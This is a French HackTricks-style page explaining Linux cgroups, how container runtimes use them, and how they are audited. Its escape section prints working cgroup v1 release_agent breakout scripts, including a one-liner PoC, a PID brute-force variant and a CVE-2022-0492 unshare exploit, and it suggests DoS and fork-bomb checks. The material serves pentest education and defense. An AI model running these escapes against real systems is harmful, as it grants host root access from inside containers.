# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Aperçu

Linux **groupes de contrôle** sont le mécanisme du noyau utilisé pour regrouper les processus afin de faire de la comptabilité, limiter, prioriser et appliquer des politiques. Si les namespaces servent surtout à isoler la vue des ressources, les cgroups servent principalement à gouverner **combien** de ces ressources un ensemble de processus peut consommer et, dans certains cas, **quelles classes de ressources** ils peuvent du tout utiliser. Les conteneurs reposent constamment sur les cgroups, même si l'utilisateur ne les regarde jamais directement, car presque tous les runtimes modernes ont besoin d'un moyen pour dire au noyau « ces processus appartiennent à cette charge de travail, et voici les règles de ressources qui s'appliquent ».

C'est pourquoi les moteurs de conteneurs placent un nouveau conteneur dans leur propre sous-arbre cgroup. Une fois l'arborescence de processus en place, le runtime peut limiter la mémoire, restreindre le nombre de PIDs, pondérer l'utilisation du CPU, réguler les E/S et restreindre l'accès aux périphériques. En production, c'est essentiel à la fois pour la sécurité multi-tenant et pour une hygiène opérationnelle simple. Un conteneur sans contrôles de ressources significatifs peut épuiser la mémoire, inonder le système de processus ou monopoliser le CPU et les E/S d'une manière qui rend l'hôte ou les charges voisines instables.

D'un point de vue sécurité, les cgroups importent de deux façons distinctes. D'abord, des limites de ressources mauvaises ou absentes permettent des attaques de déni de service simples. Ensuite, certaines fonctionnalités des cgroups, surtout dans les anciens environnements **cgroup v1**, ont historiquement créé des primitives de breakout puissantes lorsqu'elles étaient modifiables depuis l'intérieur d'un conteneur.

## v1 Vs v2

Il existe deux modèles cgroup majeurs en circulation. **cgroup v1** expose plusieurs hiérarchies de contrôleurs, et les anciens writeups d'exploits tournent souvent autour des sémantiques étranges et parfois excessivement puissantes disponibles là. **cgroup v2** introduit une hiérarchie plus unifiée et un comportement généralement plus propre. Les distributions modernes privilégient de plus en plus cgroup v2, mais des environnements mixtes ou legacy existent encore, ce qui signifie que les deux modèles restent pertinents lors de l'audit de systèmes réels.

La différence importe parce que certaines des histoires de breakout de conteneur les plus célèbres, comme les abus de **`release_agent`** dans cgroup v1, sont très spécifiquement liées au comportement ancien des cgroups. Un lecteur qui voit un exploit cgroup sur un blog puis l'applique aveuglément à un système moderne uniquement en cgroup v2 est susceptible de mal comprendre ce qui est réellement possible sur la cible.

## Inspection

La manière la plus rapide de voir où se situe votre shell actuel est :
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Le fichier `/proc/self/cgroup` affiche les chemins cgroup associés au processus courant. Sur un hôte cgroup v2 moderne, vous verrez souvent une entrée unifiée. Sur des hôtes plus anciens ou hybrides, vous pouvez voir plusieurs chemins de contrôleur v1. Une fois que vous connaissez le chemin, vous pouvez inspecter les fichiers correspondants sous `/sys/fs/cgroup` pour voir les limites et l'utilisation actuelle.

Sur un hôte cgroup v2, les commandes suivantes sont utiles :
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ces fichiers révèlent quels contrôleurs existent et lesquels sont délégés aux cgroups enfants. Ce modèle de délégation importe dans les environnements rootless et systemd-managed, où le runtime peut ne contrôler que le sous-ensemble des fonctionnalités de cgroup que la hiérarchie parente délègue effectivement.

## Laboratoire

Une façon d'observer les cgroups en pratique est d'exécuter un conteneur limité en mémoire :
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Vous pouvez aussi essayer un conteneur limité en PID :
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Ces exemples sont utiles car ils aident à relier l'option du runtime à l'interface fichiers du noyau. Le runtime n'applique pas la règle par magie ; il écrit les paramètres cgroup pertinents puis laisse le noyau les faire respecter au sein de l'arbre de processus.

## Utilisation du runtime

Docker, Podman, containerd, et CRI-O s'appuient tous sur cgroups dans le cadre de leur fonctionnement normal. Les différences portent généralement moins sur l'utilisation des cgroups que sur **les valeurs par défaut qu'ils choisissent**, **la manière dont ils interagissent avec systemd**, **le fonctionnement de la délégation en rootless**, et **la part de la configuration contrôlée au niveau du moteur versus au niveau de l'orchestration**.

Dans Kubernetes, les resource requests et limits deviennent finalement une configuration cgroup sur le nœud. Le chemin du Pod YAML jusqu'à l'application par le noyau passe par le kubelet, le CRI runtime et le OCI runtime, mais cgroups restent le mécanisme du noyau qui applique finalement la règle. Dans les environnements Incus/LXC, les cgroups sont aussi largement utilisés, surtout parce que les system containers exposent souvent un arbre de processus plus riche et des attentes opérationnelles plus proches d'une VM.

## Mauvaises configurations et échappements

L'histoire classique de sécurité des cgroup est le mécanisme inscriptible cgroup v1 `release_agent`. Dans ce modèle, si un attaquant peut écrire dans les bons fichiers cgroup, activer `notify_on_release`, et contrôler le chemin stocké dans `release_agent`, le noyau peut finir par exécuter un chemin choisi par l'attaquant dans les initial namespaces sur l'hôte lorsque le cgroup devient vide. C'est pourquoi les anciens writeups accordent tant d'attention à la possibilité d'écriture des contrôleurs cgroup, aux options de montage et aux conditions de namespace/capability.

Même lorsque `release_agent` n'est pas disponible, les erreurs de configuration cgroup ont toujours des conséquences. Un accès trop large aux devices peut rendre les périphériques de l'hôte accessibles depuis le container. L'absence de limites de mémoire et de PID peut transformer une simple exécution de code en un DoS de l'hôte. Une délégation cgroup faible en scénarios rootless peut aussi induire en erreur les défenseurs qui supposent l'existence d'une restriction alors que le runtime n'a jamais réellement pu l'appliquer.

### Contexte de `release_agent`

La technique `release_agent` s'applique uniquement à **cgroup v1**. L'idée de base est que lorsqu'un dernier processus dans un cgroup se termine et que `notify_on_release=1` est défini, le noyau exécute le programme dont le chemin est stocké dans `release_agent`. Cette exécution a lieu dans les initial namespaces sur l'hôte, ce qui transforme un `release_agent` inscriptible en container escape primitive.

Pour que la technique fonctionne, l'attaquant a généralement besoin de :

- une hiérarchie cgroup v1 inscriptible
- la capacité de créer ou d'utiliser un cgroup enfant
- la capacité de définir `notify_on_release`
- la capacité d'écrire un chemin dans `release_agent`
- un chemin qui résout vers un exécutable du point de vue de l'hôte

### PoC classique

Le PoC historique en une ligne est :
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Cette PoC écrit le chemin du payload dans `release_agent`, déclenche la libération du cgroup, puis lit le fichier de sortie généré sur l'hôte.

### Explication pas à pas

La même idée est plus facile à comprendre lorsqu'elle est décomposée en étapes.

1. Créez et préparez un cgroup accessible en écriture:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifier le chemin sur l'hôte qui correspond au système de fichiers du conteneur :
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Déposer un payload qui sera visible depuis le chemin de l'hôte:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Déclencher l'exécution en vidant le cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
L'effet est une exécution côté hôte du payload avec les privilèges root de l'hôte. Dans un exploit réel, le payload écrit généralement un fichier de preuve, lance un reverse shell, ou modifie l'état de l'hôte.

### Variante par chemin relatif utilisant `/proc/<pid>/root`

Dans certains environnements, le chemin sur l'hôte vers le filesystem du container n'est pas évident ou est masqué par le storage driver. Dans ce cas, le chemin du payload peut être exprimé via `/proc/<pid>/root/...`, où `<pid>` est un PID hôte appartenant à un processus dans le container courant. C'est la base de la variante brute-force par chemin relatif :
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Le truc pertinent ici n'est pas la force brute elle‑même mais la forme du chemin : `/proc/<pid>/root/...` permet au noyau de résoudre un fichier à l'intérieur du système de fichiers du conteneur depuis l'espace de noms hôte, même lorsque le chemin de stockage direct sur l'hôte n'est pas connu à l'avance.

### Variante CVE-2022-0492

En 2022, CVE-2022-0492 a montré que l'écriture dans `release_agent` en cgroup v1 ne vérifiait pas correctement la présence de `CAP_SYS_ADMIN` dans l'**initial** espace de noms utilisateur. Cela rendait la technique bien plus accessible sur les noyaux vulnérables, car un processus dans le conteneur capable de monter une hiérarchie cgroup pouvait écrire dans `release_agent` sans déjà être privilégié dans l'espace de noms utilisateur de l'hôte.

Exploit minimal:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Sur un noyau vulnérable, l'hôte exécute `/proc/self/exe` avec les privilèges root de l'hôte.

Pour exploiter cela de manière pratique, commencez par vérifier si l'environnement expose encore des chemins cgroup-v1 accessibles en écriture ou un accès à des périphériques dangereux :
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Si `release_agent` est présent et accessible en écriture, vous êtes déjà en territoire legacy-breakout :
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Si le chemin cgroup lui-même ne permet pas d'escape, l'utilisation pratique suivante est souvent le denial of service ou la reconnaissance :
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Ces commandes indiquent rapidement si la charge de travail peut effectuer un fork-bomb, consommer la mémoire de façon agressive, ou abuser d'une interface cgroup héritée et écrivable.

## Vérifications

Lors de l'examen d'une cible, l'objectif des vérifications cgroup est de déterminer quel modèle de cgroup est utilisé, si le container voit des chemins de contrôleur écrivables, et si d'anciennes breakout primitives telles que `release_agent` sont même pertinentes.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Ce qui est intéressant ici :

- Si `mount | grep cgroup` affiche **cgroup v1**, d'anciennes breakout writeups deviennent plus pertinentes.
- Si `release_agent` existe et est accessible, cela mérite immédiatement une analyse plus approfondie.
- Si la hiérarchie cgroup visible est inscriptible et que le container dispose également de capabilities élevées, l'environnement mérite un examen beaucoup plus approfondi.

Si vous découvrez **cgroup v1**, des montages de contrôleur inscriptibles, et un container qui a aussi des capabilities élevées ou une protection seccomp/AppArmor faible, cette combinaison mérite une attention particulière. Les cgroups sont souvent considérés comme un sujet ennuyeux de gestion des ressources, mais historiquement ils ont fait partie de certaines des chaînes d'évasion de container les plus instructives précisément parce que la frontière entre "contrôle des ressources" et "influence sur l'hôte" n'a pas toujours été aussi nette que les gens le supposaient.

## Runtime Defaults

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut | Les containers sont placés dans des cgroups automatiquement ; les limites de ressources sont optionnelles à moins d'être définies via des flags | omission de `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Activé par défaut | `--cgroups=enabled` est le comportement par défaut ; les valeurs par défaut du cgroup namespace varient selon la version de cgroup (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, accès aux périphériques assoupli, `--privileged` |
| Kubernetes | Activé via le runtime par défaut | Pods et containers sont placés dans des cgroups par le runtime du nœud ; le contrôle fin des ressources dépend de `resources.requests` / `resources.limits` | omission des resource requests/limits, accès privilégié aux périphériques, mauvaise configuration du runtime au niveau hôte |
| containerd / CRI-O | Activé par défaut | les cgroups font partie de la gestion normale du cycle de vie | configurations runtime directes qui assouplissent les contrôles des périphériques ou exposent des interfaces cgroup v1 héritées inscriptibles |

La distinction importante est que **l'existence des cgroups** est généralement activée par défaut, tandis que **des contraintes de ressources utiles** sont souvent optionnelles à moins d'être configurées explicitement.
